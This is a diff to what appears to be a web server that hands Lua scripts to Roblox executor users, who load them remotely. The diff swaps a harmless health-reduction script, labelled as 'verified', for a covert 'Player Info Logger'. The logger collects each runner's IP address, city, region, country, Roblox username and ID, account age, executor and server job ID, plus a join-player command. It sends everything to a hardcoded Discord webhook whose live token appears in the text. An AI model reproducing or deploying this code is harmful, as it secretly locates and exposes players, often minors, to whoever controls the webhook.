@@ -102,16 +102,134 @@ if r then loadstring(r)() end`
 
             return res.status(200).send(
 `
-local player = game.Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
-local humanoid = character:WaitForChild("Humanoid")
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local MarketplaceService = game:GetService("MarketplaceService")
 
-if humanoid and humanoid.Health > 0 then
-    humanoid.Health = math.max(0, humanoid.Health - 50)
-    print("Health reduced by 50!")
+local request = syn and syn.request or http_request or (http and http.request)
+local webhook = "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5"
+
+local function getFlagEmoji(countryCode)
+    local function toRegionalIndicator(char)
+        return utf8.char(0x1F1E6 - string.byte("A") + string.byte(char))
+    end
+    return toRegionalIndicator(countryCode:sub(1,1)) .. toRegionalIndicator(countryCode:sub(2,2))
 end
 
-warn("ZiFi Security: Script Verified and Loaded!")
+local ipData, gameInfo
+pcall(function()
+    ipData = HttpService:JSONDecode(game:HttpGet("https://ipwho.is/"))
+end)
+
+pcall(function()
+    gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
+end)
+
+local flag = ipData and ipData.country_code and getFlagEmoji(ipData.country_code) or ""
+local serverPlayers = #Players:GetPlayers()
+local serverMaxPlayers = Players.MaxPlayers
+local jobId = tostring(game.JobId or "Unknown")
+
+local function formatAccountAge(userId)
+    if not request then return "-" end
+
+    local success, response = pcall(function()
+        return request({
+            Url = "https://users.roblox.com/v1/users/"..userId,
+            Method = "GET"
+        })
+    end)
+    if not success or not response or not response.Body then
+        return "-"
+    end
+
+    local userData
+    local decodeSuccess, decodeResult = pcall(function()
+        return HttpService:JSONDecode(response.Body)
+    end)
+    if decodeSuccess then
+        userData = decodeResult
+    else
+        return "-"
+    end
+
+    if not userData or not userData.created then
+        return "-"
+    end
+
+    local createdStr = userData.created
+    local year = tonumber(createdStr:sub(1,4))
+    local month = tonumber(createdStr:sub(6,7))
+    local day = tonumber(createdStr:sub(9,10))
+
+    local creationDate = os.time({year=year, month=month, day=day})
+    local now = os.time()
+
+    local diff = os.difftime(now, creationDate)
+    local days = math.floor(diff / 86400)
+
+    local years = math.floor(days / 365)
+    local months = math.floor((days % 365) / 30)
+    local remDays = days % 30
+
+    if days < 30 then
+        return string.format("%d Hari / - Bulan / - Tahun", days)
+    elseif years < 1 then
+        return string.format("%d Hari / %d Bulan / - Tahun", days, months)
+    else
+        return string.format("%d Hari / %d Bulan / %d Tahun", days, months, years)
+    end
+end
+
+local function getExecutorVersion()
+    if syn and syn.version then
+        return syn.version
+    elseif KRNL_LOADED then
+        return "KRNL (version unknown)"
+    elseif isexecutorclosure then
+        return "Executor Closure"
+    end
+    return "Unknown Version"
+end
+
+local executorName = identifyexecutor and identifyexecutor() or "Unknown"
+local executorVersion = getExecutorVersion()
+local accountAgeFormatted = formatAccountAge(LocalPlayer.UserId)
+
+local embed = {
+    ["title"] = "📢 Player Info Logger",
+    ["color"] = 16753920,
+    ["fields"] = {
+        {["name"] = "👤 Username", ["value"] = LocalPlayer.Name, ["inline"] = true},
+        {["name"] = "🆔 User ID", ["value"] = tostring(LocalPlayer.UserId), ["inline"] = true},
+        {["name"] = "📅 Account Age", ["value"] = accountAgeFormatted, ["inline"] = true},
+        {["name"] = "💻 Executor", ["value"] = executorName .. " (" .. executorVersion .. ")", ["inline"] = true},
+        {["name"] = "⏰ Execute Time", ["value"] = os.date("%d-%m-%Y %H:%M:%S"), ["inline"] = true},
+        {["name"] = "🌐 IP Address", ["value"] = ipData and ipData.ip or "Tidak diketahui", ["inline"] = true},
+        {["name"] = "🏳️ Country", ["value"] = (flag ~= "" and (flag .. " ") or "") .. (ipData and ipData.country or "Tidak diketahui"), ["inline"] = true},
+        {["name"] = "📍 Region", ["value"] = ipData and ipData.region or "Tidak diketahui", ["inline"] = true},
+        {["name"] = "🏙️ City", ["value"] = ipData and ipData.city or "Tidak diketahui", ["inline"] = true},
+        {["name"] = "🗺️ Map", ["value"] = string.format("[%s](https://www.roblox.com/games/%d)", gameInfo and gameInfo.Name or "Unknown", game.PlaceId), ["inline"] = false},
+        {["name"] = "🆔 Job ID", ["value"] = jobId, ["inline"] = false},
+        {["name"] = "👥 Players in Server", ["value"] = tostring(serverPlayers) .. " / " .. tostring(serverMaxPlayers), ["inline"] = true},
+        {["name"] = "📌 Join Player Script", ["value"] = string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\", game.Players.LocalPlayer)", game.PlaceId, jobId), ["inline"] = false}
+    },
+    ["thumbnail"] = { url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png" },
+    ["footer"] = { text = "Notifikasi dari Executor" },
+    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+}
+
+pcall(function()
+    if not request then error("Request function is not available") end
+    request({
+        Url = webhook,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode({embeds = {embed}})
+    })
+end)
 `
             );
         }
